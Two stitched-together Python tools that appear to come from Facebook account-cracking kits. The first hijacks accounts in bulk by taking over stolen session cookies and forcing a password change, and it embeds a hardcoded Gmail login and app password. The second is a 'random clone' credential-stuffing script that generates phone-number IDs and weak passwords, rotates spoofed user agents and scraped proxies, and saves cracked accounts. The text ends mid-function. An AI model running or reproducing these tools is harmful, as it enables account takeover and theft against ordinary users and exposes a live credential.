		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : KANO")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "KANO@@@"
		logo()
		p(" [•] Password Changer By : KANO")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				p(" [•] Check Your Internet")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "KANO"
		logo()
		p(" [•] Password Changer By : KANO ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			p(" [•] Check Your Internet")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update
		
#created by adi
#tottaly written by Mr Adi
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit

###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Pro07.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '{RED}'
H = '{GREEN}'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
import random
cokbrut=[]
ses=requests.Session()
princp=[]
twf =[]
user=[]
ugen=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    ugen.append(xx)

loop = 0
cp = []
ok = []
twf = []

ugen = []
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.bbnew.txt','r').read().splitlines()

loop = 0
cp = []
ok = []
twf = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

logo ="""  \033[1;92m _______  _______    _______  ______  _________
  \033[1;97m(       )(  ____ )  (  ___  )(  __  \ \__   __/
  \033[1;92m| () () || (    )|  | (   ) || (  \  )   ) (   
  \033[1;97m| || || || (____)|  | (___) || |   ) |   | |   
  \033[1;92m| |(_)| ||     __)  |  ___  || |   | |   | |   
  \033[1;97m| |   | || (\ (     | (   ) || |   ) |   | |   
  \033[1;92m| )   ( || ) \ \__  | )   ( || (__/  )___) (___
  \033[1;97m|/     \||/   \__/  |/     \|(______/ \_______/
\033[1;97m====================================================
\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mMR Adi
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mMRADI5000
\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+18133035186
\033[1;97m====================================================
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY MR Adi ]\x1b[00;1m\x1b[31;1m
\033[1;97m===================================================="""
clear()
os.system("xdg-open https://www.facebook.com/mradi5000")
xxxx = str(len(ugen))
print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
print('\033[1;97m====================================================') 
print("\033[1;97m[+]\033[1;92m TOTAL USER AGENTS \033[1;91m: \033[1;96m" + xxxx)
print('\033[1;97m====================================================') 
print (' \t           \033[1;37m[ \033[1;32mINTRODUCTION \033[1;37m]')
print('\033[1;97m====================================================') 
NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;96m')
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owners) Adi & Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

#---------------------[MAIN MENU]---------------------#
def main():
    clear()
    os.getuid
    os.system("clear");print(logo)
    clear()
    print (' \t           \033[1;37m[ \033[1;32mMAIN MENU \033[1;37m]')
    print('\033[1;97m====================================================') 
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
    print('\033[1;97m====================================================') 
    print(f"\033[1;97m[01] \033[1;92mRANDOM CLONE ")
    print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
    print(f"\033[1;97m[00] \033[1;92mEXIT ")
    print('\033[1;97m====================================================') 
    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT OPTION \033[1;37m: \033[1;36m")
    if adi in ["1","01"]:
        passx()
    elif adi in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/mradi5000")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        main()

def passx():
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print('              \x1b[97m\033[37;41m[ PASSWORD MENU ]\033[0;m ')
    print('\033[1;97m====================================================') 
    print("\033[1;97m[01] \033[1;92mAUTO PASS 7 DIGITS         \033[1;96m[FASTEST]")
    print("\033[1;97m[02] \033[1;92mAUTO PASS 7 AND 11 DIGITS  \033[1;96m[FAST]")
    print("\033[1;97m[03] \033[1;92mAUTO PASS 7 DIGIT AND KHAN \033[1;96m[FAST]")
    print("\033[1;97m[04] \033[1;92mONLY KHAN PASS             \033[1;96m[SLOWEST]")
    print("\033[1;97m[05] \033[1;92mKHAN & ALI MIX PASS        \033[1;96m[SLOWEST]")
    print("\033[1;97m[06] \033[1;92mKHAN & MALIK MIX PASS      \033[1;96m[SLOWEST]")
    print("\033[1;97m====================================================")
    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT PASSWORD METHOD \033[1;37m: \033[1;36m")
    if adi in ["1","01"]:
        pass1()
    elif adi in ["2","02"]:
        pass2()
    elif adi in ["3","03"]:
        pass3()
    elif adi in ["4","04"]:
       pass4()
    elif adi in ["5","05"]:
       pass5()
    elif adi in ["6","06"]:
       pass6()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        passx()

def pass1():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m1') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = [love,]
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def pass2():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m2') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = [love,uid]
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
def pass3():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
